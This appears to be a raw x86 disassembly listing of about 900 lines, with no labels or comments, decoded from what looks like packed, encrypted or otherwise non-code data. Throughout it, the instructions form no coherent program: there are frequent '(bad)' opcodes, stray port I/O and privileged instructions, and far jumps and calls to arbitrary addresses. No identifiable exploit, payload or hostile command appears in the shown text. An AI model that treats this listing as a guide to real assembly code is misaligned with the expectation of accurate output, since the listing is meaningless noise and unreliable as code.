  414ef9:	scas   al,BYTE PTR es:[edi]
  414efa:	sbb    BYTE PTR [edi-0x27],dl
  414efd:	iret   
  414efe:	out    0xf9,eax
  414f00:	push   eax
  414f01:	daa    
  414f02:	int    0x26
  414f04:	fdiv   st,st(6)
  414f06:	addr16 or ah,cl
  414f09:	lds    edx,FWORD PTR [edx-0x22f5434d]
  414f0f:	pop    ebx
  414f10:	lods   al,BYTE PTR ds:[esi]
  414f11:	outs   dx,BYTE PTR ds:[esi]
  414f12:	cmp    BYTE PTR [edx+ebp*8],dl
  414f15:	push   ebx
  414f16:	retf   0x8243
  414f19:	inc    esp
  414f1a:	mov    BYTE PTR [ebx],0xb9
  414f1d:	sbb    ebx,DWORD PTR [ecx-0x7f]
  414f20:	aaa    
  414f21:	inc    ecx
  414f22:	push   esi
  414f23:	cwde   
  414f24:	cld    
  414f25:	cmc    
  414f26:	adc    DWORD PTR [edx+0x34],esp
  414f29:	jo     0x414f37
  414f2b:	cld    
  414f2c:	test   DWORD PTR [ebx+0x5091869a],ecx
  414f32:	sub    ah,cl
  414f34:	(bad)  
  414f35:	push   edi
  414f36:	aas    
  414f37:	xchg   edx,eax
  414f38:	cmp    DWORD PTR ds:[ebx+edi*1],esi
  414f3c:	jge    0x414f04
  414f3e:	sub    BYTE PTR [edx-0x4b],ch
  414f41:	push   0xa9b080b9
  414f46:	int3   
  414f47:	pop    esi
  414f48:	imul   ebp,DWORD PTR [esp+0x0],0x48
  414f4d:	push   cs
  414f4e:	stc    
  414f4f:	xchg   esp,eax
  414f50:	mov    edi,0x6147bf06
  414f55:	xchg   DWORD PTR [edx+0x2d57995a],esp
  414f5b:	mov    bh,0x88
  414f5d:	push   0xffffff8d
  414f5f:	call   0x57e1e31
  414f64:	bound  eax,QWORD PTR [edi+0x14]
  414f67:	pop    es
  414f68:	add    BYTE PTR [eax+ebx*8+0x6d20c9dc],al
  414f6f:	inc    ebx
  414f70:	loope  0x414f8e
  414f72:	(bad)  
  414f73:	es jg  0x414ff0
  414f76:	and    al,0xc3
  414f78:	ins    DWORD PTR es:[di],dx
  414f7a:	mov    ebp,edx
  414f7c:	pop    esp
  414f7d:	mov    bl,BYTE PTR [edx]
  414f7f:	fsubr  QWORD PTR [ebx+ebp*2]
  414f82:	(bad)  
  414f83:	cmp    eax,DWORD PTR [ebp-0x53]
  414f86:	inc    ebx
  414f87:	cmp    DWORD PTR [ecx+ebp*4],esp
  414f8a:	sub    DWORD PTR ds:0x5a3a47c9,ecx
  414f90:	mov    dh,0x25
  414f92:	inc    ebp
  414f93:	pop    ds
  414f94:	leave  
  414f95:	jmp    0x259c7c59
  414f9a:	push   0x43
  414f9c:	stc    
  414f9d:	jmp    0x6a01:0xd5445721
  414fa4:	jg     0x414f7b
  414fa6:	and    edi,DWORD PTR [edx-0x413cf834]
  414fac:	jne    0x414f95
  414fae:	pop    ds
  414faf:	fdiv   QWORD PTR [ebp-0x1d83f14f]
  414fb5:	retf   0xe8b6
  414fb8:	dec    ebp
  414fb9:	shl    edi,cl
  414fbb:	aam    0xa1
  414fbd:	aam    0x3b
  414fbf:	push   ss
  414fc0:	jmp    0x414f8d
  414fc2:	jnp    0x414faf
  414fc4:	and    cl,BYTE PTR ds:0x61ee7181
  414fca:	loope  0x414fc8
  414fcc:	icebp  
  414fcd:	push   ecx
  414fce:	aaa    
  414fcf:	adc    DWORD PTR [esi],edi
  414fd1:	jno    0x414fc4
  414fd3:	or     eax,0xb2119ead
  414fd8:	lods   al,BYTE PTR ds:[esi]
  414fd9:	inc    BYTE PTR [ebp+0x30]
  414fdc:	pusha  
  414fdd:	pop    ds
  414fde:	cs push edx
  414fe0:	mov    esi,DWORD PTR [ebp+0x4e]
  414fe3:	mov    dh,0xfa
  414fe5:	add    al,0xad
  414fe7:	scas   eax,DWORD PTR es:[edi]
  414fe8:	jb     0x415026
  414fea:	inc    ebp
  414feb:	call   0xdf51:0x44715c5b
  414ff2:	and    BYTE PTR [esi+0x3be2296],bl
  414ff8:	push   esp
  414ff9:	sub    ch,BYTE PTR [edi-0x560f3047]
  414fff:	inc    esi
  415000:	jmp    DWORD PTR [edi]
  415002:	(bad)  
  415003:	xchg   edx,eax
  415004:	add    eax,0x77fa4dee
  415009:	dec    esi
  41500a:	push   ebx
  41500b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41500c:	xchg   BYTE PTR ds:0x8342f6a9,bl
  415012:	sub    edi,DWORD PTR [edx+0x6e6f3470]
  415018:	and    edi,DWORD PTR [edi-0x36]
  41501b:	inc    esp
  41501c:	or     ebx,edx
  41501e:	cs mov esi,0x6a2be0f8
  415024:	cmp    BYTE PTR [ecx-0x56],al
  415027:	pushf  
  415028:	push   edx
  415029:	mov    edi,0xb9a710e9
  41502e:	pop    ds
  41502f:	(bad)  [edx]
  415031:	xor    al,0xe
  415033:	enter  0xfc89,0x9e
  415037:	jle    0x41500c
  415039:	(bad)  
  41503a:	icebp  
  41503b:	rcl    DWORD PTR [ecx-0x6e0d1c3b],cl
  415041:	dec    ebp
  415042:	jmp    FWORD PTR [eax+0x31f998bf]
  415048:	adc    BYTE PTR [ecx+0x5f4e46b3],ah
  41504e:	mov    gs,WORD PTR [edx+0x3f372ae1]
  415054:	add    bh,BYTE PTR [ecx-0x12]
  415057:	push   ebp
  415058:	aad    0x44
  41505a:	xchg   edi,eax
  41505b:	ja     0x415010
  41505d:	and    ebx,edi
  41505f:	sbb    eax,0x30366757
  415064:	jmp    0x4150cc
  415066:	push   ecx
  415067:	mov    bl,0x41
  415069:	adc    al,0x5
  41506b:	push   edx
  41506c:	xchg   edi,eax
  41506d:	(bad)  
  41506e:	in     al,dx
  41506f:	test   DWORD PTR [ebx-0x9],eax
  415072:	daa    
  415073:	mov    dl,0x36
  415075:	or     eax,0x55977c35
  41507a:	imul   ecx,esi,0xffffff82
  41507d:	fucomi st,st(5)
  41507f:	adc    ah,bl
  415081:	sbb    DWORD PTR [ecx+0x24d72a72],edx
  415087:	fild   QWORD PTR [ebx+0x58]
  41508a:	sub    cl,cl
  41508c:	xor    ebx,esp
  41508e:	and    eax,0xc778967c
  415093:	or     cl,ch
  415095:	jb     0x415054
  415097:	fistp  WORD PTR [edx-0x7f273710]
  41509d:	xor    bl,BYTE PTR [edx+0xa]
  4150a0:	arpl   WORD PTR [ebp+0x63bcd9e2],ax
  4150a6:	test   BYTE PTR [edx+0x1ccc860c],ah
  4150ac:	test   ch,cl
  4150ae:	stos   BYTE PTR es:[edi],al
  4150af:	and    al,0xac
  4150b1:	bnd jmp 0x4d130a76
  4150b7:	pop    ebx
  4150b8:	push   ds
  4150b9:	sbb    BYTE PTR [eax-0x20],ch
  4150bc:	mov    dl,0x7c
  4150be:	ret    
  4150bf:	jge    0x415061
  4150c1:	jns    0x415113
  4150c3:	push   esi
  4150c4:	out    dx,al
  4150c5:	pop    ebx
  4150c6:	push   esi
  4150c7:	cld    
  4150c8:	add    BYTE PTR [eax-0x3],bl
  4150cb:	pop    ecx
  4150cc:	retf   
  4150cd:	pop    ds
  4150ce:	adc    eax,0xb5259b1c
  4150d3:	inc    edi
  4150d4:	push   ebx
  4150d5:	mov    bh,0x6d
  4150d7:	ja     0x4150c6
  4150d9:	push   cs
  4150da:	test   al,0x97
  4150dc:	test   DWORD PTR [eax-0x6088e20c],esi
  4150e2:	add    ebx,esp
  4150e4:	adc    ch,BYTE PTR [esi+eax*4+0x77]
  4150e8:	xor    edi,esi
  4150ea:	jb     0x4150e8
  4150ec:	and    BYTE PTR [ecx-0xe],0xc3
  4150f0:	inc    ebp
  4150f1:	iret   
  4150f2:	sti    
  4150f3:	jg     0x4150b0
  4150f5:	sti    
  4150f6:	ins    BYTE PTR es:[edi],dx
  4150f7:	cdq    
  4150f8:	jmp    0x41513e
  4150fa:	inc    esi
  4150fb:	adc    al,0x31
  4150fd:	xchg   ecx,eax
  4150fe:	pop    eax
  4150ff:	xchg   ecx,eax
  415100:	xlat   BYTE PTR ds:[ebx]
  415101:	fwait
  415102:	inc    edx
  415103:	xchg   BYTE PTR [eax+0x7c3a76d5],bl
  415109:	fist   WORD PTR [ebx+eiz*8-0x4ec6f5d6]
  415110:	inc    eax
  415111:	fcmovnbe st,st(2)
  415113:	pop    esi
  415114:	retf   
  415115:	(bad)  
  415116:	mov    ds,esp
  415118:	aam    0xbc
  41511a:	fdiv   QWORD PTR [eax]
  41511c:	test   al,0x36
  41511e:	inc    DWORD PTR [edi]
  415120:	adc    bh,bh
  415122:	and    eax,0x252a9509
  415127:	mov    BYTE PTR ds:0x7db1ed0b,dl
  41512d:	push   esi
  41512e:	loop   0x41518c
  415130:	(bad)  
  415132:	retf   0x67f5
  415135:	rol    BYTE PTR [edi],cl
  415137:	lods   al,BYTE PTR ds:[esi]
  415138:	mov    ebp,0xc5913f7
  41513d:	adc    ecx,DWORD PTR [eax+0x76]
  415140:	mov    esp,esi
  415142:	push   esp
  415143:	push   eax
  415144:	pusha  
  415145:	cmc    
  415146:	xor    DWORD PTR [ebp+0x2d382411],esi
  41514c:	mov    WORD PTR [edi+ecx*8-0x4d7bd74f],cs
  415153:	xchg   ebp,eax
  415154:	cmp    DWORD PTR [edi],esp
  415156:	dec    ebx
  415157:	fisubr WORD PTR [eax-0x19ef2489]
  41515d:	adc    DWORD PTR [edi+0x2c],edi
  415160:	cs psubq mm3,mm3
  415164:	xchg   ecx,eax
  415165:	push   esi
  415166:	repnz not BYTE PTR [esi+0x5]
  41516a:	retf   
  41516b:	fidivr WORD PTR [edi+0x6f08616f]
  415171:	or     DWORD PTR [ebx-0x368aad57],esi
  415177:	push   ebp
  415178:	(bad)  
  415179:	test   al,0x31
  41517b:	sub    dl,BYTE PTR ds:0x7d1a7172
  415181:	mov    esp,0xb8dea038
  415186:	aam    0xaa
  415188:	mov    cl,0x39
  41518a:	mov    ch,0x78
  41518c:	rol    DWORD PTR [ebx+0x60],1
  41518f:	inc    esi
  415190:	rcl    BYTE PTR [eax],cl
  415192:	push   esi
  415193:	das    
  415194:	in     eax,dx
  415195:	push   ds
  415196:	iret   
  415197:	(bad)  
  415199:	lock fnstsw WORD PTR [bx+di-0x42]
  41519e:	add    al,0xe5
  4151a0:	jle    0x415210
  4151a2:	push   ebx
  4151a3:	std    
  4151a4:	scas   al,BYTE PTR es:[edi]
  4151a5:	pop    ds
  4151a6:	fild   QWORD PTR [esi]
  4151a8:	inc    esi
  4151a9:	fist   WORD PTR [edi]
  4151ab:	retf   
  4151ac:	adc    eax,0x1d978998
  4151b1:	(bad)  
  4151b2:	out    0x4,al
  4151b4:	cmc    
  4151b5:	(bad)  
  4151b6:	ror    DWORD PTR [esi+0x42],cl
  4151b9:	pop    edx
  4151ba:	mov    edi,0xdd0e2ed0
  4151bf:	jmp    0xd054:0xcfac483c
  4151c6:	test   BYTE PTR [esi],cl
  4151c8:	fsubr  DWORD PTR [esp+ebx*4]
  4151cb:	mov    edi,0xce64fcc1
  4151d0:	(bad)  
  4151d1:	fisttp DWORD PTR [eax+0xc018bc4]
  4151d7:	dec    ebx
  4151d8:	sub    esp,DWORD PTR [eax+0x1e]
  4151db:	std    
  4151dc:	jmp    0x18595acb
  4151e1:	adc    ah,bl
  4151e3:	out    0xb1,eax
  4151e5:	mov    ebp,0xf5f0af9d
  4151ea:	scas   eax,DWORD PTR es:[edi]
  4151eb:	lds    edx,FWORD PTR [ebp-0x38]
  4151ee:	xor    eax,DWORD PTR [ebp-0x40]
  4151f1:	sbb    BYTE PTR [ecx],ch
  4151f3:	xchg   edi,eax
  4151f4:	jmp    0xca6c:0xfcb9fdc2
  4151fb:	imul   edx,DWORD PTR [edx+0x312cc697],0x89934830
  415205:	xlat   BYTE PTR ds:[ebx]
  415206:	ret    0x8d4f
  415209:	fwait
  41520a:	sti    
  41520b:	lahf   
  41520c:	dec    edi
  41520d:	dec    eax
  41520e:	test   ch,ah
  415210:	pop    ds
  415211:	outs   dx,DWORD PTR ds:[esi]
  415212:	xchg   BYTE PTR [edi],ch
  415214:	gs pop esp
  415216:	inc    eax
  415217:	mov    cl,0xbf
  415219:	pop    ss
  41521a:	sub    BYTE PTR [esi+edx*2+0x292b2625],0x45
  415222:	es retf 0x3de4
  415226:	inc    edi
  415227:	outs   dx,DWORD PTR ds:[esi]
  415228:	sbb    al,0x42
  41522a:	adc    eax,0x6080717e
  41522f:	pop    ds
  415230:	in     eax,dx
  415231:	stos   DWORD PTR es:[edi],eax
  415232:	and    al,bl
  415234:	loope  0x4151fe
  415236:	mov    bh,0x7a
  415238:	mov    DWORD PTR [ebp-0x64],eax
  41523b:	outs   dx,DWORD PTR ds:[esi]
  41523c:	xchg   ecx,eax
  41523d:	mov    eax,ds:0x7fde2e7d
  415242:	xchg   DWORD PTR [esi-0xf],esi
  415245:	mov    DWORD PTR [eax-0x61b32cca],ebp
  41524b:	aaa    
  41524c:	xchg   DWORD PTR [edi+0x7289c0ff],ebp
  415252:	dec    eax
  415253:	xor    ebp,edx
  415255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415256:	mov    eax,0x338d22a2
  41525b:	push   cs
  41525c:	sbb    DWORD PTR [edx+0x261d75e6],edx
  415262:	ficom  DWORD PTR [ecx+0x4f838c6b]
  415268:	loope  0x4151ec
  41526a:	fcomp  st(4)
  41526c:	inc    ebx
  41526d:	stos   BYTE PTR es:[edi],al
  41526e:	adc    eax,0xa41cd651
  415273:	test   al,0x6b
  415275:	sbb    eax,0xebd539f6
  41527a:	inc    edi
  41527b:	nop
  41527c:	test   eax,0x7c714b3
  415281:	adc    al,0x6a
  415283:	(bad)  
  415285:	push   edi
  415286:	mov    dh,0x18
  415288:	std    
  415289:	test   DWORD PTR [eax-0x18b1025e],ebp
  41528f:	lds    ebx,FWORD PTR [eax+0x66af52c5]
  415295:	and    bh,al
  415297:	retf   0x905a
  41529a:	js     0x41524e
  41529c:	inc    esi
  41529d:	xor    BYTE PTR es:[ecx+eax*1],0x90
  4152a2:	popa   
  4152a3:	mov    fs,WORD PTR [ebp+0x2f]
  4152a6:	arpl   WORD PTR [edi+0x44fc28e3],ax
  4152ac:	loope  0x4152ec
  4152ae:	or     ch,dh
  4152b0:	xor    edx,edi
  4152b2:	lds    esp,FWORD PTR [edi+ebp*2+0x637840ad]
  4152b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ba:	sti    
  4152bb:	and    ebp,DWORD PTR [esi-0x71]
  4152be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152bf:	(bad)  
  4152c1:	inc    eax
  4152c2:	(bad)  
  4152c3:	push   eax
  4152c4:	(bad)  
  4152c5:	call   0xb571f543
  4152ca:	jmp    0x4152b8
  4152cc:	loop   0x41531b
  4152ce:	jnp    0x4152bd
  4152d0:	inc    esi
  4152d1:	jmp    0xcfb9:0x203dde58
  4152d8:	mov    edx,0xb5f0704e
  4152dd:	shr    BYTE PTR ds:0xa407037,1
  4152e3:	mov    ecx,0x1da6eedc
  4152e8:	sahf   
  4152e9:	add    BYTE PTR [ebx],dl
  4152eb:	ret    
  4152ec:	out    dx,al
  4152ed:	fcomp  DWORD PTR [esi]
  4152ef:	les    esi,FWORD PTR [esi+0x6b7b04e]
  4152f5:	into   
  4152f6:	xor    eax,0x8f1e28a8
  4152fb:	ss nop
  4152fd:	sahf   
  4152fe:	mov    ds:0x5c2295b3,eax
  415303:	(bad)  
  415304:	mov    dl,0x38
  415306:	push   ebx
  415307:	mov    ds:0xdd81991f,al
  41530c:	gs mov al,0x86
  41530f:	or     DWORD PTR [edi-0x4f],esp
  415312:	mov    ds:0x6fd659a6,eax
  415317:	fidiv  DWORD PTR [edx]
  415319:	ja     0x4152fd
  41531b:	jge    0x41533e
  41531d:	dec    edi
  41531e:	pop    edi
  41531f:	sub    ecx,esi
  415321:	ja     0x41535a
  415323:	pop    esi
  415324:	mov    bl,0xde
  415326:	mov    ebx,es
  415328:	dec    ecx
  415329:	sub    al,0xdf
  41532b:	outs   dx,BYTE PTR ds:[esi]
  41532c:	push   0x53362d79
  415331:	or     dh,BYTE PTR [ecx+edi*8+0x1362ce7e]
  415338:	(bad)  
  415339:	inc    eax
  41533a:	sub    eax,0x967b4d0b
  41533f:	mov    ebp,DWORD PTR [eax]
  415341:	sub    BYTE PTR [edx+0x3ba7ae05],dl
  415347:	or     BYTE PTR [ebx],dh
  415349:	pop    esp
  41534a:	mov    ebx,0x4d1a27a9
  41534f:	arpl   WORD PTR [ecx+0x18],bx
  415352:	fs fmulp st(6),st
  415355:	pusha  
  415356:	sbb    al,0x46
  415358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415359:	jmp    0x4153c0
  41535b:	push   ebx
  41535c:	mov    cl,0x24
  41535e:	add    esp,DWORD PTR [esp+ecx*2-0x6009c2ba]
  415365:	jo     0x4152fc
  415367:	loop   0x4152ea
  415369:	ret    0x3573
  41536c:	xchg   ebp,eax
  41536d:	ins    BYTE PTR es:[edi],dx
  41536e:	repz sub eax,0x626ca84e
  415374:	jmp    0x415390
  415376:	jno    0x415340
  415378:	sbb    ch,BYTE PTR [esp+edx*8-0x63]
  41537c:	inc    esp
  41537d:	lods   eax,DWORD PTR ds:[esi]
  41537e:	cs jnp 0x4153b4
  415381:	mov    ebx,0x8a206a3c
  415386:	pop    esi
  415387:	push   esp
  415388:	mov    eax,0x50b92135
  41538d:	mov    bl,0x2d
  41538f:	xor    al,BYTE PTR [esi+0x41]
  415392:	jbe    0x41531d
  415394:	mov    esp,DWORD PTR [eax+0x10d2f4ee]
  41539a:	sbb    BYTE PTR [ecx],0xad
  41539d:	clc    
  41539e:	dec    edx
  41539f:	mov    ebx,0xff680b05
  4153a4:	aam    0x2a
  4153a6:	dec    ecx
  4153a7:	push   eax
  4153a8:	mov    WORD PTR [ebp-0x2a529a7d],?
  4153ae:	(bad)  
  4153af:	fstp   QWORD PTR [edx]
  4153b1:	mov    ch,0x94
  4153b3:	xchg   WORD PTR ds:[ebx-0x3f8140dc],bx
  4153bb:	mov    ds:0x19502fb5,al
  4153c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153c1:	dec    ebp
  4153c2:	fimul  WORD PTR [edx]
  4153c4:	xchg   esp,eax
  4153c5:	stos   DWORD PTR es:[edi],eax
  4153c6:	cmp    DWORD PTR [edi+0x79578c64],esp
  4153cc:	or     dh,dl
  4153ce:	xchg   ebx,eax
  4153cf:	mov    ecx,0x8ab025cd
  4153d4:	mov    ds:0xfa2f6d00,al
  4153d9:	push   esi
  4153da:	jns    0x415429
  4153dc:	and    eax,0x4619edce
  4153e1:	xor    bh,al
  4153e3:	adc    BYTE PTR [ebx],bh
  4153e5:	cmp    al,0xc8
  4153e7:	mov    esp,0xec0e2072
  4153ec:	jno    0x4153d4
  4153ee:	stc    
  4153ef:	mov    ebx,0x134bec4
  4153f4:	call   0x5af6:0x3b65d99c
  4153fb:	jne    0x4153d7
  4153fd:	(bad)  
  4153fe:	mov    bl,0x57
  415400:	(bad)  
  415401:	or     al,0xee
  415403:	in     eax,dx
  415404:	mov    al,ds:0x7b4bbaaf
  415409:	mov    ebx,DWORD PTR ss:[edx+0x1b]
  41540d:	pop    eax
  41540e:	in     eax,dx
  41540f:	sub    DWORD PTR [edi],0x309ba973
  415415:	mov    ds:0xa225a275,eax
  41541a:	fst    QWORD PTR [edx]
  41541c:	mov    ebx,0x50aa60e5
  415421:	push   eax
  415422:	mov    ds:0xb13e972,eax
  415427:	es std 
  415429:	push   ss
  41542a:	cdq    
  41542b:	shl    DWORD PTR [ebx+esi*8],0xc2
  41542f:	add    dh,ch
  415431:	dec    edi
  415432:	cmp    esp,ecx
  415434:	adc    esi,DWORD PTR [esi-0x1d8d246e]
  41543a:	out    0xe4,eax
  41543c:	adc    bh,al
  41543e:	fistp  QWORD PTR [ebx+0x14b70d84]
  415444:	push   ebp
  415445:	(bad)  
  415446:	jge    0x4154a6
  415448:	shl    BYTE PTR ds:0xd7677ba3,1
  41544e:	out    0x51,eax
  415450:	bts    DWORD PTR [edi-0x112d9ac5],esi
  415457:	jae    0x415496
  415459:	(bad)  
  41545a:	mov    WORD PTR [eax+0x78c4fe50],fs
  415460:	in     al,dx
  415461:	mov    edi,0x7e28f53d
  415466:	mov    WORD PTR [ecx+0x39],cs
  415469:	stc    
  41546a:	xor    cl,BYTE PTR [edi+0x68]
  41546d:	push   edx
  41546e:	adc    al,0x4e
  415470:	xchg   esi,eax
  415471:	int3   
  415472:	call   0xcca4:0x2147ab71
  415479:	adc    dl,bh
  41547b:	(bad)  [edx+0x18]
  41547e:	adc    BYTE PTR [esi+ebx*1+0x58],ch
  415482:	fistp  QWORD PTR [ecx+0x5f]
  415485:	inc    edi
  415486:	inc    edi
  415487:	dec    edi
  415488:	je     0x41540c
  41548a:	ja     0x41543e
  41548c:	sub    ah,BYTE PTR [ebp+0x1d8134b8]
  415492:	xchg   ecx,eax
  415493:	and    ch,BYTE PTR [esi+0x7436b27d]
  415499:	aas    
  41549a:	xchg   esp,eax
  41549b:	sub    ah,ch
  41549d:	ret    
  41549e:	mov    ecx,0xe00523f
  4154a3:	int3   
  4154a4:	aad    0x6c
  4154a6:	xor    al,0x94
  4154a8:	aad    0x5f
  4154aa:	out    dx,eax
  4154ab:	loop   0x41548d
  4154ad:	mov    bh,0x1a
  4154af:	mov    es,edx
  4154b1:	mov    bh,BYTE PTR [ebx+0xb]
  4154b4:	xor    DWORD PTR [ebx],esi
  4154b6:	and    DWORD PTR [eax+0x4e],eax
  4154b9:	popa   
  4154ba:	aam    0xaa
  4154bc:	mov    DWORD PTR cs:[esi+0x2f],esp
  4154c0:	jb     0x4154c0
  4154c2:	xchg   edx,ebx
  4154c4:	loopne 0x415468
  4154c6:	and    eax,0x2a2241a5
  4154cb:	lock sub bl,BYTE PTR [ecx+0x4b]
  4154cf:	fisttp QWORD PTR [edx]
  4154d1:	stos   BYTE PTR es:[edi],al
  4154d2:	cmp    ah,BYTE PTR [ebx-0x5de4f1f4]
  4154d8:	cli    
  4154d9:	pop    ebx
  4154da:	add    DWORD PTR [esi],0xf4cec3fe
  4154e0:	push   edx
  4154e1:	mov    bh,0x85
  4154e3:	scas   eax,DWORD PTR es:[edi]
  4154e4:	mov    edx,0x61c6772c
  4154e9:	dec    ebp
  4154ea:	test   BYTE PTR [ebp-0x3730e4c3],0x6
  4154f1:	xchg   ebp,eax
  4154f2:	cmp    al,0x7c
  4154f4:	xor    ah,bl
  4154f6:	sbb    DWORD PTR [edx+0x59b11c2c],esi
  4154fc:	shr    DWORD PTR [edi+0x59],cl
  4154ff:	stc    
  415500:	fcmovne st,st(6)
  415502:	push   ebp
  415503:	mov    dh,0x85
  415505:	gs inc ebx
  415507:	cdq    
  415508:	inc    ebp
  415509:	fwait
  41550a:	sub    ah,ah
  41550c:	mov    ds:0x4ceb2431,eax
  415511:	xor    dh,BYTE PTR ds:[eax-0x7c9e2633]
  415518:	pop    edi
  415519:	adc    eax,0xd5ae9f03
  41551e:	sbb    ch,0xfd
  415521:	cmp    al,BYTE PTR [ebp-0x4b955e19]
  415527:	ss mov ecx,0x1da885e
  41552d:	rol    DWORD PTR [esi],cl
  41552f:	outs   dx,BYTE PTR ds:[esi]
  415530:	dec    ebp
  415531:	repz inc ecx
  415533:	fmulp  st(2),st
  415535:	pop    ds
  415536:	xchg   ebx,eax
  415537:	inc    ebp
  415538:	cmp    DWORD PTR [edx],0xffffffc1
  41553b:	in     eax,dx
  41553c:	lds    edi,FWORD PTR [esi-0x16]
  41553f:	mov    DWORD PTR [ecx-0x543494eb],0x5dd0233c
  415549:	ins    BYTE PTR es:[edi],dx
  41554a:	push   DWORD PTR [esi-0x6ab1384]
  415550:	iret   
  415551:	in     al,0x6d
  415553:	out    0x2a,eax
  415555:	mov    ds:0x89ff4700,eax
  41555a:	add    eax,0xa5d83c5
  41555f:	pop    ebp
  415560:	and    DWORD PTR [edx+0x77b8641f],esi
  415566:	push   esp
  415567:	imul   edx,DWORD PTR [ecx+0x6e],0xffffff8c
  41556b:	aam    0x85
  41556d:	(bad)  
  41556e:	cld    
  41556f:	ret    
  415570:	imul   ebx,DWORD PTR [ecx],0x1db9b294
  415576:	sbb    DWORD PTR [ecx-0x460e7e5],edx
  41557c:	lods   eax,DWORD PTR ds:[esi]
  41557d:	push   edi
  41557e:	xor    dh,BYTE PTR [esp+edi*2+0x59]
  415582:	adc    edx,DWORD PTR [edx]
  415584:	sahf   
  415585:	dec    ecx
  415586:	ficomp WORD PTR [ecx+0x32e6816d]
  41558c:	scas   al,BYTE PTR es:[edi]
  41558d:	mov    edi,DWORD PTR [ecx-0x6fe44da]
  415593:	inc    ebx
  415594:	mov    ah,0xb2
  415596:	mov    cl,0x65
  415598:	jp     0x41557e
  41559a:	sub    dh,BYTE PTR [eax+0x2dc0f2b9]
  4155a0:	and    al,0xd2
  4155a2:	xchg   DWORD PTR [eax+0x42c76c34],ecx
  4155a8:	sub    BYTE PTR [esi+ebx*1-0x2a],bh
  4155ac:	add    al,0x1c
  4155ae:	in     al,0xcb
  4155b0:	daa    
  4155b1:	imul   edi,DWORD PTR [edi-0x23a97a6f],0xffffffef
  4155b8:	jb     0x415584
  4155ba:	in     al,dx
  4155bb:	lods   eax,DWORD PTR ds:[esi]
  4155bc:	(bad)  
  4155bd:	push   cs
  4155be:	sbb    BYTE PTR [ebp+0x4bb3be24],bh
  4155c4:	dec    ebx
  4155c5:	aam    0x16
  4155c7:	out    dx,eax
  4155c8:	ss ss rol cl,0xc1
  4155cd:	push   cs
  4155ce:	lods   al,BYTE PTR ds:[esi]
  4155cf:	retf   0x6419
  4155d2:	mov    dh,0x6
  4155d4:	and    esp,DWORD PTR [ecx]
  4155d6:	and    al,0x73
  4155d8:	ss fcomp st(3)
  4155db:	push   eax
  4155dc:	addr16 mov ds:0xaa2a,eax
  4155e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e1:	hlt    
  4155e2:	ja     0x41558c
  4155e4:	icebp  
  4155e5:	mov    al,ds:0x49b06f95
  4155ea:	pop    edi
  4155eb:	sbb    edx,DWORD PTR [edi-0x484be5f]
  4155f1:	fcomp  QWORD PTR [ebx+0x56388d53]
  4155f7:	sar    esp,1
  4155f9:	test   eax,0xf10cab09
  4155fe:	and    esp,ebx
  415600:	pop    ebp
  415601:	inc    eax
  415602:	cwde   
  415603:	add    edx,DWORD PTR [ebp-0x6f4c6d81]
  415609:	mov    bh,BYTE PTR [ebx*1+0x5de110b]
  415610:	push   edx
  415611:	fdiv   QWORD PTR [edi+eax*2]
  415614:	std    
  415615:	pop    esp
  415616:	pop    esp
  415617:	test   al,0xa3
  415619:	add    BYTE PTR [ecx],al
  41561b:	or     eax,0x7bdd3f02
  415620:	lock xor DWORD PTR [ebp-0x1],ecx
  415624:	sbb    BYTE PTR [edx+0x5d7f7885],bl
  41562a:	and    edi,eax
  41562c:	aam    0xfa
  41562e:	xchg   esp,eax
  41562f:	mov    edi,0x129d9a31
  415634:	pop    ebx
  415635:	sbb    ah,BYTE PTR [esi-0x3a2d34ce]
  41563b:	and    BYTE PTR [ebx+edx*4],dh
  41563e:	inc    ebx
  41563f:	aad    0xca
  415641:	psubusw mm6,mm0
  415644:	icebp  
  415645:	dec    edx
  415646:	dec    ecx
  415647:	ds retf 
  415649:	xor    DWORD PTR [ebp-0x3c30502f],esi
  41564f:	sub    eax,0x6a3e6641
  415654:	out    dx,al
  415655:	jo     0x41568e
  415657:	sub    BYTE PTR [ebx*8+0x7268abb],ch
  41565e:	and    BYTE PTR [edi+0x70],0xaa
  415662:	push   0xffffffc2
  415664:	mul    BYTE PTR ds:0xb51d3bb7
  41566a:	push   ds
  41566b:	push   esi
  41566c:	je     0x41562a
  41566e:	sbb    eax,0x7343954c
  415673:	pusha  
  415674:	daa    
  415675:	sub    al,BYTE PTR [esi-0x7c0a9039]
  41567b:	cmc    
  41567c:	dec    ebp
  41567d:	pushf  
  41567e:	inc    esi
  41567f:	jmp    0x41563c
  415681:	and    eax,0x49b4f80
  415686:	jno    0x41562a
  415688:	dec    ebx
  415689:	stc    
  41568a:	jnp    0x415662
  41568c:	je     0x415698
  41568e:	je     0x415626
  415690:	mov    eax,0x290074b1
  415695:	sub    BYTE PTR [ebp+0x29fb9157],ch
  41569b:	mov    eax,ds:0x6b072e4d
  4156a0:	iret   
  4156a1:	icebp  
  4156a2:	push   ebp
  4156a3:	call   0x7e050b74
  4156a8:	cdq    
  4156a9:	xchg   ebx,eax
  4156aa:	repz mov ebp,DWORD PTR [ecx-0x80]
  4156ae:	and    eax,0x60221b1c
  4156b3:	jl     0x415732
  4156b5:	and    edi,DWORD PTR [edi-0x13]
  4156b8:	out    0x9a,eax
  4156ba:	sbb    DWORD PTR cs:[ebx-0x2b],esi
  4156be:	xchg   BYTE PTR [edx-0x3],ah
  4156c1:	and    BYTE PTR [ecx],ch
  4156c3:	inc    eax
  4156c4:	mov    dh,BYTE PTR ds:0x5cb9c6a0
  4156ca:	jge    0x4156ca
  4156cc:	push   ebx
  4156cd:	push   edx
  4156ce:	ss jne 0x4156b8
  4156d1:	ins    DWORD PTR es:[edi],dx
  4156d2:	adc    ah,BYTE PTR [edx+ebx*2-0x677d2a09]
  4156d9:	mov    ah,0x27
  4156db:	xor    eax,0x8d23b33
  4156e0:	inc    esp
  4156e1:	inc    edi
  4156e2:	jns    0x415705
  4156e4:	lods   al,BYTE PTR ds:[esi]
  4156e5:	fsubr  QWORD PTR [edx]
  4156e7:	aam    0xe9
  4156e9:	pop    eax
  4156ea:	pusha  
  4156eb:	test   BYTE PTR [ebp+0x2c],cl
  4156ee:	pop    ebp
  4156ef:	pusha  
